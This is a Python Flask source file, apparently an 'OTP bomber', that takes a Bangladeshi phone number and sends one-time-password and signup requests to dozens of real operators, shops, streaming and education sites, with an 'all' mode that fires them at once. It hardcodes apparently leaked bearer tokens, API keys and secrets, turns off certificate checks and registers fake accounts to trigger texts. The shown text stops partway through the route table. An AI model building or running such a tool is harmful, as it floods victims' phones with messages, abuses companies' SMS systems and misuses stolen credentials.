"""
============================================================
  EXODUS OTP API - MASTER (ALL MODE)
  Author   : @exodus_owner
  Runtime  : Python 3.11 + Flask
  Usage    : /?phone=01XXXXXXXXX&api=all   (সব একসাথে)
             /?phone=01XXXXXXXXX&api=robi  (একটা)
============================================================
"""

import os, re, json, random, string, time, uuid
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, request, jsonify

app = Flask(__name__)

DEVELOPER = "@exodus_owner"
VERSION   = "1.0.0"
TIMEOUT   = 20

# ---------- HELPERS ----------
def footer(data):
    data["developer"] = DEVELOPER
    data["version"]   = VERSION
    return data

def send(url, data=None, headers=None, method="POST", cookies=None):
    try:
        kw = {"headers": headers or {}, "timeout": TIMEOUT, "verify": False}
        if cookies: kw["cookies"] = cookies
        if method.upper() == "POST":
            if isinstance(data, str):   kw["data"] = data
            elif isinstance(data, dict): kw["json"] = data
            r = requests.post(url, **kw)
        else:
            r = requests.get(url, **kw)
        try:    return r.json()
        except: return {"raw": r.text[:300], "code": r.status_code}
    except Exception as e:
        return {"error": str(e)[:200]}

def rnd(n=8, chars=None):
    chars = chars or (string.ascii_lowercase + string.digits)
    return "".join(random.choice(chars) for _ in range(n))

def valid_bd(p): return bool(re.match(r"^01[3-9][0-9]{8}$", p))

# ═══════════════════════════════════════════════════
#  ALL API FUNCTIONS
# ═══════════════════════════════════════════════════

# ---- MOBILE OPERATORS ----
def api_robi(p):
    return send("https://webapi.robi.com.bd/v1/account/register/otp",
        {"phone_number": p},
        {"User-Agent":"Mozilla/5.0","Content-Type":"application/json",
         "X-CSRF-TOKEN":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY4MTQ3MjU5NiwibmJmIjoxNjgxNDcyNTk2LCJleHAiOjE2ODE0NzYxOTYsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.-k1ByaD69rmEy1NXzEIT08fJvZ9c6OysjmaQfe8hEz0",
         "Authorization":"Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY4MTQ3MjU5NiwibmJmIjoxNjgxNDcyNTk2LCJleHAiOjE2ODE0NzYxOTYsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.-k1ByaD69rmEy1NXzEIT08fJvZ9c6OysjmaQfe8hEz0"})

def api_robi2(p):
    return send("https://webapi.robi.com.bd/v1/send-otp",
        {"phone_number":p,"type":"doorstep"},
        {"Authorization":"Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY5MjY0MjcyOCwibmJmIjoxNjkyNjQyNzI4LCJleHAiOjE2OTI2NDYzMjgsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc",
         "Content-Type":"application/json"})

def api_gp(p):
    return send("https://bkwebsitethc.grameenphone.com/api/v1/offer/send_otp",
        {"msisdn":p},
        {"Accept":"application/json","Content-Type":"application/json",
         "Origin":"https://www.grameenphone.com","Referer":"https://www.grameenphone.com/",
         "User-Agent":"Mozilla/5.0","lang":"en"})

def api_gp2(p):
    return send("https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
        {"phone":p,"email":"","language":"en"},
        {"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Linux; Android 8.0.0)"})

def api_gpay(p):
    return send("https://gpayapp.grameenphone.com/prod_mfs/sub/user/checksignup",
        {"deviceId":f"35{p}30","msisdn":p,"tran_type":"OTPREQSIGNUP"},
        {"Content-Type":"application/json"})

def api_banglalink(p):
    return send("https://myblapi.banglalink.net/api/v1/send-otp",
        {"phone":p},{"Content-Type":"application/json"})

# ---- EDUCATION ----
def api_shikho(p):
    j = {"phone":p,"type":"student","auth_type":"signup","vendor":"shikho"}
    return send("https://api.shikho.com/auth/v2/send/sms", j,
        {"Host":"api.shikho.com","Accept":"application/json","Content-Type":"application/json",
         "Origin":"https://app.shikho.com","Referer":"https://app.shikho.com/","User-Agent":"Mozilla/5.0"})

def api_ghoori(p):
    return send("https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
        json.dumps({"mobile_no":p}),
        {"content-type":"application/json","origin":"https://ghoorilearning.com",
         "referer":"https://ghoorilearning.com/","user-agent":"Mozilla/5.0 (Linux; Android 13)"})

def api_quizgiri(p):
    return send("https://developer.quizgiri.xyz:443/api/v2.0/send-otp",
        {"phone":p,"country_code":"+880"},{"Content-Type":"application/json"})

def api_quiztime(p):
    return send("https://developer.quiztime.gamehubbd.com/api/v2.0/send-otp",
        {"country_code":"+88","phone":p},{"Content-Type":"application/json"})

def api_chorcha(p):
    return send(f"https://mujib.chorcha.net/auth/check?phone={p}",
        method="GET",
        headers={"accept":"*/*","x-chorcha-mode":"prod","x-chorcha-platform":"web"})

def api_medha(p):
    return send("https://developer.medha.info/api/send-otp",
        {"phone":"880"+p.lstrip("0"),"is_register":"1"},
        {"User-Agent":"Dart/3.2 (dart:io)","content-type":"application/json; charset=utf-8","authorization":"Bearer"})

def api_iqra(p):
    return send(f"http://apibeta.iqra-live.com/api/v1/sent-otp/{p}", method="GET")

# ---- E-COMMERCE ----
def api_chokrojan(p):
    return send("https://chokrojan.com/api/v1/passenger/login/mobile",
        {"mobile_number":p,"otp_token":"826cb796fd3f163c420c8da1238aa9d1c4da36d4f5729d711a9cacaca47df5a7"},
        {"Accept":"application/json","Content-Type":"application/json;charset=UTF-8",
         "Origin":"https://chokrojan.com","Referer":"https://chokrojan.com/login",
         "User-Agent":"Mozilla/5.0","company-id":"1","domain-name":"chokrojan.com","user-platform":"3"})

def api_shomvob(p):
    return send("https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0",
        {"phone":"88"+p},
        {"User-Agent":"Dalvik/2.1.0 (Linux; U; Android 13)",
         "Authorization":"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s",
         "Content-Type":"application/json; charset=utf-8"})

def api_wafilife(p):
    url = (f"https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p={p}"
           f"&consumer_key=ck_e8c5b4a69729dd913dce8be03d7878531f6511ff"
           f"&consumer_secret=cs_f866e5c6543065daa272504c2eea71044579cff3")
    return send(url, method="GET")

def api_sindabad(p):
    return send("https://offers.sindabad.com/api/mobile-otp",
        {"key":"c94e67fb2a59af3b6fa21f24463b2061","mobile":"+88"+p},
        {"Content-Type":"application/json","Origin":"https://sindabad.com",
         "Referer":"https://sindabad.com/","User-Agent":"Mozilla/5.0",
         "Authorization":"Bearer ODdweWQ2OTJwbDNiYjR6azMyazJpenBrdHQ2MjYybnZhc2luZGFiYWRjb21tb3ppbGxhNTAgd2luZG93cyBudCAxMDAgd2luNjQgeDY0IGFwcGxld2Via2l0NTM3MzYga2h0bWwgbGlrZSBnZWNrbyBjaHJvbWUxNDMwMDAgc2FmYXJpNTM3MzZiYW5kb3JjOTRlNjdmYjJhNTlhZjNiNmZhMjFmMjQ0NjNiMjA2MQ=="})

def api_bdstall(p):
    return send("https://www.bdstall.com/userRegistration/save_otp_info/",
        {"UserTypeID":"2","RequestType":"1","Name":"Md","Mobile":p},
        {"Content-Type":"application/x-www-form-urlencoded"})

def api_khaasfood(p):
    csrf="9d9d08e6e5"; url="https://www.khaasfood.com/wp-admin/admin-ajax.php"
    h={"content-type":"application/x-www-form-urlencoded; charset=UTF-8",
       "origin":"https://www.khaasfood.com","referer":"https://www.khaasfood.com/",
       "x-requested-with":"XMLHttpRequest","user-agent":"Mozilla/5.0"}
    r1=send(url,{"mobileNo":p,"countrycode":"+880","csrf":csrf,"login":"1","json":"1","action":"digits_check_mob"},h)
    r2=send(url,{"mobileNo":p,"digits_reg_mail":p,"dig_nounce":csrf,"action":"digits_check_mob",
                 "login":"2","countrycode":"+880","digregcode":"+880","digregcode2":"+880",
                 "digits":"1","dtype":"2","json":"1","csrf":csrf},h)
    return {"step1":r1,"step2":r2}

def api_walton(p):
    payload={"operationName":"createCustomerOtp",
        "variables":{"auth":{"countryCode":"880",
            "deviceUuid":"998283c0-622a-11ee-84c0-190466a47baa","phone":p},"device":None},
        "query":"mutation createCustomerOtp($auth: CustomerAuthInput!, $device: DeviceInput) { createCustomerOtp(auth: $auth, device: $device) { message statusCode result { id __typename } __typename } }"}
    return send("https://api.waltonplaza.com.bd/graphql", payload, {"Content-Type":"application/json"})

def api_sundora(p):
    payload={"customer":{"email":f"kgjkgjgg{p}@gmail.com","password":"#bUV?'3*N#7N}.g",
        "password_confirmation":"#bUV?'3*N#7N}.g","phone":"+880"+p[1:],
        "draft_order_id":None,"first_name":"sdfgfd","last_name":"fgfd",
        "note":{"birthday":"","gender":"male"},"withTimeout":True,
        "newsletter_email":True,"newsletter_sms":True}}
    return send("https://api.sundora.com.bd/api/user/customer/", payload,
        {"Content-Type":"application/json","Referer":"https://sundora.com.bd/","Origin":"https://sundora.com.bd","User-Agent":"Mozilla/5.0"})

def api_chorki(p):
    return send("https://api-dynamic.chorki.com/v1/auth/login?country=BD&platform=mobile",
        {"number":p},{"User-Agent":"Chorki/2.0.33 (Android 13)","Content-Type":"application/json"})

def api_bioscope(p):
    return send("https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
        {"number":"+88"+p},{"accept":"application/json","content-type":"application/json",
        "origin":"https://www.bioscopeplus.com","referer":"https://www.bioscopeplus.com/","user-agent":"Mozilla/5.0"})

def api_deeptoplay(p):
    return send("https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
        {"number":"+88"+p},{"accept":"application/json","content-type":"application/json",
        "origin":"https://www.deeptoplay.com","referer":"https://www.deeptoplay.com/","user-agent":"Mozilla/5.0"})

def api_cinematic(p):
    return send(f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/{p}",
        {"headers":{"Content-Type":"application/json",
            "Access-Control-Allow-Origin":"*",
            "Authorization":"Bearer 1pake4mh5ln64h5t26kpvm3iri"}},
        {"Accept":"application/json","Content-Type":"application/json;charset=UTF-8",
         "Origin":"https://cinematic.mobi","Referer":"https://cinematic.mobi/","User-Agent":"Mozilla/5.0"})

def api_cinematic2(p):
    return send(f"https://api.mygp.cinematic.mobi/api/v1/otp/88{p}/SBENT_3GB7D",
        '{"accessinfo":{"access_token":"K165S6V6q4C6G7H0y9C4f5W7t5YeC6","referenceCode":"20190827042622"}}',
        {"User-Agent":"Mozilla/5.0","Content-Type":"application/json"})

def api_cinematic3(p):
    return send(f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{p}/",
        "{}",{"User-Agent":"Mozilla/5.0","Content-Type":"application/json"})

def api_bdtickets(p):
    return send("https://api.bdtickets.com:20100/v1/auth",
        {"createUserCheck":True,"phoneNumber":"+88"+p,"applicationChannel":"WEB_APP"},
        {"content-type":"application/json","origin":"https://bdtickets.com",
         "referer":"https://bdtickets.com/","user-agent":"Mozilla/5.0"})

def api_bikroy(p):
    return send(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={p}",
        method="GET",
        headers={"accept":"application/json","application-name":"web",
                 "referer":"https://bikroy.com/en","user-agent":"Mozilla/5.0"})

def api_redx(p):
    return send("https://api.redx.com.bd/v1/user/signup",
        {"name":p,"service":"redx","phoneNumber":p},{"Content-Type":"application/json"})

def api_redx2(p):
    return send("https://api.redx.com.bd:443/v1/user/signup",
        {"name":"Alamin Sheikh","phoneNumber":p,"service":"redx"},{"Content-Type":"application/json"})

def api_rflbestbuy(p):
    return send("https://rflbestbuy.com/api/login/?lang_code=en&currency_code=BDT",
        {"company_id":"26","password2":"Riyaz@123","currency_code":"BDT","user_type":"C",
         "email":f"{p}@gmail.com","g_id":"","lang_code":"en","operating_system":"Android",
         "otp_verify":False,"password1":"Riyaz@123","phone":p,"storefront_id":"3"},
        {"Host":"rflbestbuy.com",
         "Authorization":"Bearer bWlzNTdAcHJhbmdyb3VwLmNvbTpJWE94N1NVUFYwYUE0Rjg4Nmg4bno5V2I2STUzNTNBQQ==",
         "Content-Type":"application/json","User-Agent":"okhttp/4.2.2"})

def api_circle(p):
    return send("https://reseller.circle.com.bd/api/v2/auth/signup",
        {"name":"+88"+p,"email_or_phone":"+88"+p,"password":"123456",
         "password_confirmation":"123456","register_by":"phone"},
        {"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})

def api_bcsexamaid(p):
    return send("https://bcsexamaid.com/api/generateotp",
        {"mobile":p,"softtoken":"Rifat.Admin.2022"},
        {"User-Agent":"Dart/3.1 (dart:io)","Accept":"application/json","Content-Type":"application/json; charset=utf-8"})

def api_sheba(p):
    t = send("https://accounts.sheba.xyz/api/v1/accountkit/generate/token?app_id=8329815A6D1AE6DD", method="GET")
    token = t.get("token","") if isinstance(t,dict) else ""
    o = send("https://accountkit.sheba.xyz/api/shoot-otp",
        {"mobile":"+88"+p,"app_id":"8329815A6D1AE6DD","api_token":token},
        {"Content-Type":"application/json"})
    return {"token_step":t,"otp_step":o}

def api_apex4u(p):
    return send("https://api.apex4u.com/api/auth/login",{"phoneNumber":p},
        {"accept":"application/json","content-type":"application/json",
         "origin":"https://apex4u.com","referer":"https://apex4u.com/","user-agent":"Mozilla/5.0"})

def api_kireibd(p):
    return send("https://app.kireibd.com/api/v2/send-login-otp",{"email":p},
        {"Content-Type":"application/json","user-agent":"Mozilla/5.0",
         "x-xsrf-token":"eyJpdiI6Imh2dU9zVk9rQUR5TjlsQVBvd2F2cVE9PSIsInZhbHVlIjoiQlZUdXlHcmpES2FGUXBja1dZbUZXZG9MVksreEwxa1ZzZGgzYml3MHIxMmlraURSTjVLUnpPY0ZEeEJmSldqNGNaOG5rc0FNYkVDMlJqakJmZGVlckdvNVFobnBzTFpOSnpsbVZENlVvUW5JSHhvMkYxd1VKcG9Zc0tmTUlEdUQiLCJtYWMiOiJiZjIwNmQ0OWNlZTFiYWMyZWQ4YWRmMTEzYjAwNWFkOTNmOTgzMzRiODJlZWMxOWM0MTFhOGNkODhjNzQzZWQxIiwidGFnIjoiIn0="})

def api_arogga(p):
    body = (f"------WebKitFormBoundaryYpsCATbORcIEoBtS\r\n"
            f"Content-Disposition: form-data; name=\"mobile\"\r\n\r\n{p}\r\n"
            f"------WebKitFormBoundaryYpsCATbORcIEoBtS\r\n"
            f"Content-Disposition: form-data; name=\"fcmToken\"\r\n\r\n\r\n"
            f"------WebKitFormBoundaryYpsCATbORcIEoBtS\r\n"
            f"Content-Disposition: form-data; name=\"referral\"\r\n\r\n\r\n"
            f"------WebKitFormBoundaryYpsCATbORcIEoBtS--")
    return send("https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=122.0.0.0&os=Windows&osv=10",
        body,{"content-type":"multipart/form-data; boundary=----WebKitFormBoundaryYpsCATbORcIEoBtS",
              "origin":"https://www.arogga.com","referer":"https://www.arogga.com/","user-agent":"Mozilla/5.0"})

def api_arogga2(p):
    return send("https://api.arogga.com/auth/v1/sms/send?f=app&v=6.2.7&os=android&osv=33",
        {"mobile":p,"fcmToken":"cQYjPWHHTDu1IVXnW90Xqs:APA91bHB71xe_ai41Vm-aq9DFkukrF9mAH13DPAIInmus7pykdI49PZTgqy4Qy5x8Q5TG6zd1HIOIGDCV8UH5K5l3rc1Z36R-km9T-NhotH3TBjhJOZ43Kw2xqr8lr3vuWgTMUHybMnR","referral":""},
        {"User-Agent":"okhttp/4.9.2","Content-Type":"application/x-www-form-urlencoded"})

def api_osudpotro(p):
    return send("https://api.osudpotro.com/api/v1/users/send_otp",
        {"mobile":"+88-"+p,"deviceToken":"app","language":"bn","os":"android"},
        {"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})

def api_hishabexpress(p):
    return send("https://api.hishabexpress.com/login/status",
        {"msisdn":p,"hash":"Hello"},
        {"user-agent":"Dart/2.19 (dart:io)","Content-Type":"application/x-www-form-urlencoded"})

def api_kabbik(p):
    return send("https://api.kabbik.com/v1/auth/otpnew",
        {"msisdn":"88"+p,"currentTimeLong":int(time.time()*1000),"passKey":"qOQNBtVmoTTPVmfn"},
        {"Content-Type":"application/json","origin":"https://kabbik.com","referer":"https://kabbik.com/",
         "user-agent":"Mozilla/5.0",
         "authorization":"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMjgyMCIsInJvbGUiOjEsImlhdCI6MTY2NTc0NjIyNX0.dSY47sipaGTI_OtsysFWw_kaKZKWHWRtp4vklstVgVc"})

def api_applink(p):
    return send("https://apps.applink.com.bd/appstore-v4-server/login/otp/request",
        {"msisdn":"88"+p},{"Content-Type":"application/json","origin":"https://applink.com.bd",
        "referer":"https://applink.com.bd/","user-agent":"Mozilla/5.0"})

def api_priyos(p):
    return send("https://app.priyoshikkhaloy.com/api/user/register-login.php",
        {"mobile":p},{"User-Agent":"okhttp/4.11.0","Content-Type":"application/x-www-form-urlencoded"})

def api_salextra(p):
    return send("https://salextra.com.bd/customer/checkusernameavailabilityonregistration",
        {"username":p,"loginType":"MOBILE",
         "__RequestVerificationToken":"CfDJ8LiTcoRywYZJiSdmMqGF8TUqJw9C6KMdGm1h66OVTdHacNf0PM5Ejsmu_DNPddqz7Sk-XUyXwxIyHALKpZ5bn1jwr9l-9IzOmASY_Z3cKb2mndEZn3KyLqq80U8QyitKCPtmt1zxxiMWd_970_jfTmg"},
        {"content-type":"application/x-www-form-urlencoded; charset=UTF-8",
         "origin":"https://salextra.com.bd","referer":"https://salextra.com.bd/register",
         "user-agent":"Mozilla/5.0","x-requested-with":"XMLHttpRequest"})

def api_drl(p):
    return send("https://doctorlivebd.com/api/patient/auth/otpsend",
        {"country_code":"880","mobile":p.lstrip("0")},
        {"User-Agent":"okhttp/4.10.0","Content-Type":"application/x-www-form-urlencoded"})

# ---- COURIER / MISC ----
def api_sundarban(p):
    payload={"operationName":"CreateAccessToken",
        "variables":{"accessTokenFilter":{"userName":p}},
        "query":"mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }"}
    return send("https://api-gateway.sundarbancourierltd.com/graphql", payload,
        {"Content-Type":"application/json","Host":"api-gateway.sundarbancourierltd.com",
         "Referer":"https://customer.sundarbancourierltd.com/","Origin":"https://customer.sundarbancourierltd.com"})

def api_kotha(p):
    did = str(uuid.uuid4())
    s1 = send("https://user.kotha.im/mobile/api/deviceAuthWithRecipientStatus",
        {"deviceId":did,"recipient":"+88"+p},
        {"User-Agent":"okhttp/4.12.0","Content-Type":"application/json; charset=UTF-8"})
    token = s1.get("token") if isinstance(s1,dict) else None
    s2 = None
    if token:
        s2 = send("https://user.kotha.im/mobile/api/sendOTPV2",
            {"deviceId":did,"recipient":"+88"+p,"retryAttempt":0},
            {"User-Agent":"kotha-android","Authorization":token,"Content-Type":"application/json; charset=UTF-8"})
    return {"step1":s1,"step2":s2}

def api_btcl(p):
    return send("https://phonebill.btcl.com.bd/api/ecare/anonym/sendOTP.json",
        {"OTPType":15,"userName":p,"isNewPhoneOrEmail":False},
        {"content-type":"application/json","origin":"https://phonebill.btcl.com.bd",
         "referer":"https://phonebill.btcl.com.bd/login","user-agent":"Mozilla/5.0","token":""},
        cookies={"token":""})

def api_btcl2(p):
    return send("https://phonebill.btcl.com.bd/api/ecare/anonym/sendOTP.json",
        {"phoneNbr":p,"email":"","OTPType":1,"userName":""},
        {"content-type":"application/json","origin":"https://phonebill.btcl.com.bd",
         "referer":"https://phonebill.btcl.com.bd/register","user-agent":"Mozilla/5.0","token":""},
        cookies={"token":""})

def api_bdia(p):
    return send("https://bdia.btcl.com.bd/client/client/registrationMobVerification-2.jsp?moduleID=1",
        {"actionType":"otpSend","mobileNo":p.lstrip("0")},
        {"content-type":"application/x-www-form-urlencoded","origin":"https://bdia.btcl.com.bd",
         "referer":"https://bdia.btcl.com.bd/client/client/registrationMobVerification-1.jsp?moduleID=1",
         "user-agent":"Mozilla/5.0"},
        cookies={"JSESSIONID":"A0A3A69EB76E7313AE7641F9C08F08F7","perf_dv6Tr4n":"1"})

def api_pbs(p):
    return send("https://apialpha.pbs.com.bd/api/OTP/generateOTP",
        {"userPhone":p,"otp":""},
        {"content-type":"application/json","origin":"https://pbs.com.bd",
         "referer":"https://pbs.com.bd/","user-agent":"Mozilla/5.0"})

def api_dressup(p):
    return send("https://dressup.com.bd/wp-json/api/flutter_user/digits/send_otp",
        {"country_code":"+880","mobile":p.lstrip("0"),"type":"login","whatsapp":False},
        {"User-Agent":"Dart/3.5 (dart:io)","content-type":"application/json; charset=utf-8"})

def api_aarong(p):
    url="https://mcprod.aarong.com/graphql"
    h={"content-type":"application/json","origin":"https://www.aarong.com",
       "referer":"https://www.aarong.com/","store":"default","user-agent":"Mozilla/5.0"}
    q1={"query":f'query{{ checkCustomerExist(mobile_number:"{p}", email:""){{ status message }} }}'}
    q2={"query":"mutation generateCustomerToken($email: String!, $password: String!, $type: String!, $mobile_number: String!) { generateCustomerToken(email: $email password: $password type: $type mobile_number: $mobile_number) { token message } }",
        "variables":{"email":"","password":"","type":"mobile_number","mobile_number":p}}
    q3={"query":"mutation resendOtp($email: String, $mobile_number: String!, $type: String!) { resendOtp(input: { email: $email mobile_number: $mobile_number type: $type }) }",
        "variables":{"email":"","mobile_number":p,"type":"mobile_number"}}
    return {"check":send(url,q1,h),"token":send(url,q2,h),"resend":send(url,q3,h)}

def api_fabrilife(p):
    s1=send("https://fabrilife.com/api/wp-json/wc/v2/user/register",
        {"name":"Test User","email":f"{p}@gmail.com","phone":p,"password":"Riyaz@123"},
        {"User-Agent":"okhttp/3.12.12","Content-Type":"application/json"})
    s2=send(f"https://fabrilife.com/api/wp-json/wc/v2/user/phone-login/{p}",{},
        {"User-Agent":"okhttp/3.12.12","otpkey":"uzmgAMHfQrukDqV1ecZ2xJGwqjiVPnE0byuqw2MW"})
    return {"signup":s1,"otp":s2}

def api_garibook(p):
    return send("https://api.garibookadmin.com/api/v3/user/login",
        {"mobile":p,"recaptcha_token":"garibookcaptcha","channel":"web"},
        {"content-type":"application/json","origin":"https://garibook.com",
         "referer":"https://garibook.com/","user-agent":"Mozilla/5.0"})

def api_kfc(p):
    return send("https://api.kfcbd.com/register",
        {"id":None,"name":"Sojib khane","email":f"monirk2ib+{rnd(8)}@gmail.com",
         "mobile":p,"address":None,"device_token":"dLvYmVLqT02A_ZAFsFa8gJ:APA91bHC8CtSoO-TaN-NFm4obg10-Blc1vji2lbq82KbIyEGsXobCa8hZs-XbWjyTYnLE7KgYDRWKdteBgU6zvixuYG-vV4aGCEvkItCk6DiXYKVvd_ecWxqraqX6vyYJMfWDWDeF1EG",
         "token":None,"dob":"","otp":None},
        {"User-Agent":"Dart/3.1 (dart:io)","Content-Type":"application/json"})

def api_foodaholic(p):
    formatted="+88"+p.lstrip("0")
    h={"User-Agent":"Dart/3.2 (dart:io)","Content-Type":"application/json; charset=UTF-8",
       "authorization":"Bearer null","x-localization":"en"}
    fp=send("https://foodaholic.com.bd/api/v1/auth/forgot-password",{"phone":formatted},h)
    return {"forgot_password":fp}

def api_eatzy(p):
    return send("https://api.eat-z.com/auth/customer/app-connect",
        {"username":"+880"+p.lstrip("0")},
        {"User-Agent":"okhttp/4.12.0","x-eatz-apiclient":"ANDROID",
         "content-type":"application/json; charset=UTF-8"})

def api_eonbazar(p):
    reg=send("https://app.eonbazar.com/api/auth/register",
        {"mobile":p,"name":rnd(8).capitalize(),"password":"Soji12345","email":f"{rnd(10)}@gmail.com"},
        {"Content-Type":"application/json","carttoken":str(uuid.uuid4()),
         "ordersource":"web","origin":"https://eonbazar.com","referer":"https://eonbazar.com/"})
    log=send("https://app.eonbazar.com/api/auth/login",
        {"method":"otp","mobile":p.lstrip("0")},
        {"content-type":"application/json","carttoken":str(uuid.uuid4()),
         "origin":"https://eonbazar.com","referer":"https://eonbazar.com/"})
    return {"register":reg,"login_otp":log}

def api_bdjobs(p):
    fname=random.choice(["Arif","Hasib","Kamrul","Sohag","Raihan"])
    email=fname.lower()+rnd(8)+"@gmail.com"
    payload={"firstName":fname,"lastName":"","gender":"M","email":email,
             "userName":p,"password":"Kamrul12345@","confirmPassword":"Kamrul12345@",
             "status":0,"mobile":p,"workAreaCategory":2,"createdFrom":0,
             "createdAt":time.strftime("%Y-%m-%dT%H:%M:%S%z"),
             "catTypeId":1,"userNameType":"mobile","countryCode":"88","isActive":0}
    return send("https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/CreateAccountOrchestrator/CreateAccount",
        payload,{"content-type":"application/json","origin":"https://mybdjobs.bdjobs.com",
        "referer":"https://mybdjobs.bdjobs.com/","user-agent":"Mozilla/5.0"})

def api_sw(p):
    return send("https://www.shwapno.com/api/auth",{"phoneNumber":"+88"+p},
        {"content-type":"application/json","origin":"https://www.shwapno.com",
         "referer":"https://www.shwapno.com/","user-agent":"Mozilla/5.0"})

def api_proiojon(p):
    r=rnd(12)
    return send("https://billing.proiojon.com/api/v1/auth/sign-up",
        {"name":r[:10],"phone":p,"email":r+"@gmail.com",
         "password":"password123","ref_code":""},
        {"content-type":"application/json; charset=UTF-8","origin":"https://proiojon.com",
         "referer":"https://proiojon.com/","user-agent":"Mozilla/5.0",
         "x-localization":"en","zoneid":"[2]"})

def api_beautybooth(p):
    return send("https://admin.beautybooth.com.bd/api/v2/auth/signup",
        {"phone":p},{"User-Agent":"Dart/2.19 (dart:io)","Content-Type":"application/json; charset=utf-8"})

def api_ultimatelife(p):
    reg=send("https://ultimateasiteapi.com/api/register-customer",
        {"customer_name":"hu","customer_password":"12345678",
         "customer_password_confirmation":"12345678","customer_email":p+"hu@gmail.com",
         "customer_contact":p,"customer_dob":"2000-01-02","customer_gender":"male"},
        {"Content-Type":"application/json"})
    fgp=send("https://ultimateasiteapi.com/api/forget-customer-password",
        {"user_input":p},{"content-type":"application/json",
         "origin":"https://ultimateorganiclife.com","referer":"https://ultimateorganiclife.com/",
         "user-agent":"Mozilla/5.0"})
    return {"register":reg,"forgot":fgp}

def api_binge(p):
    return send(f"https://web-api.binge.buzz/api/v3/otp/send/{p}",method="GET",
        headers={"Accept":"application/json","Device-Type":"web",
                 "Origin":"https://binge.buzz","Referer":"https://binge.buzz/",
                 "User-Agent":"Mozilla/5.0 (Linux; Android 13; RMX3286)",
                 "Authorization":"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJGcmVlIiwiY3JlYXRlZEF0IjoiY3JlYXRlIGRhdGUiLCJ1cGRhdGVkQXQiOiJ1cGRhdGUgZGF0ZSIsInR5cGUiOiJ0b2tlbiIsImRldlR5cGUiOiJ3ZWIiLCJleHRyYSI6IjMxNDE1OTI2IiwiaWF0IjoxNzAzODUwMjYxLCJleHAiOjE3MDQwMjMwNjF9.nCgP-U4r6CYuTO_i4Nz97YiaI2jsi45d2n-9ZQN3qt0"})

def api_etestpaper(p):
    h={"content-type":"application/json","origin":"https://www.etestpaper.net",
       "referer":"https://www.etestpaper.net/","user-agent":"Mozilla/5.0"}
    return {"exists":send("https://prod.etestpaper.net/api/exists",{"phone":p},h),
            "otp":send("https://prod.etestpaper.net/api/v4/auth/otp",
                       {"phone":p,"recaptcha":"668be73dcad2999a957ff440"},h)}

def api_chardike(p):
    return send("https://api.chardike.com/api/otp/send",
        {"phone":p,"otp_type":"login"},
        {"content-type":"application/json","origin":"https://chardike.com",
         "referer":"https://chardike.com/","user-agent":"Mozilla/5.0"})

def api_doctime(p):
    return send("https://api.doctime.com.bd/api/authenticate",
        {"contact_no":p,"country_calling_code":"88"},
        {"User-Agent":"okhttp/4.12.0","Content-Type":"application/json",
         "app-version":"0.29.11","platform":"Android","locale":"bn"})

def api_gpweblogin(p):
    return send("https://weblogin.grameenphone.com/backend/api/v1/otp",
        {"msisdn":p},{"Content-Type":"application/json",
        "Origin":"https://weblogin.grameenphone.com",
        "Referer":"https://weblogin.grameenphone.com/","User-Agent":"Mozilla/5.0"})

# ═══════════════════════════════════════════════════
#  ROUTE MAP
# ═══════════════════════════════════════════════════
ROUTES = {
    "robi":api_robi, "robi2":api_robi2, "gp":api_gp, "gp2":api_gp2,
    "gpay":api_gpay, "banglalink":api_banglalink,
    "shikho":api_shikho, "ghoori":api_ghoori,
    "quizgiri":api_quizgiri, "quiztime":api_quiztime,
    "chorcha":api_chorcha, "medha":api_medha, "iqra":api_iqra,
    "chokrojan":api_chokrojan, "shomvob":api_shomvob,
    "wafilife":api_wafilife, "sindabad":api_sindabad,
    "bdstall":api_bdstall, "khaasfood":api_khaasfood,
    "walton":api_walton, "sundora":api_sundora,
    "chorki":api_chorki, "bioscope":api_bioscope,
    "deeptoplay":api_deeptoplay,
    "cinematic":api_cinematic, "cinematic2":api_cinematic2, "cinematic3":api_cinematic3,
    "bdtickets":api_bdtickets, "bikroy":api_bikroy,
    "redx":api_redx, "redx2":api_redx2,
    "rflbestbuy":api_rflbestbuy, "circle":api_circle,
    "bcsexamaid":api_bcsexamaid, "sheba":api_sheba,
    "apex4u":api_apex4u, "kireibd":api_kireibd,
    "arogga":api_arogga, "arogga2":api_arogga2,
    "osudpotro":api_osudpotro, "hishabexpress":api_hishabexpress,
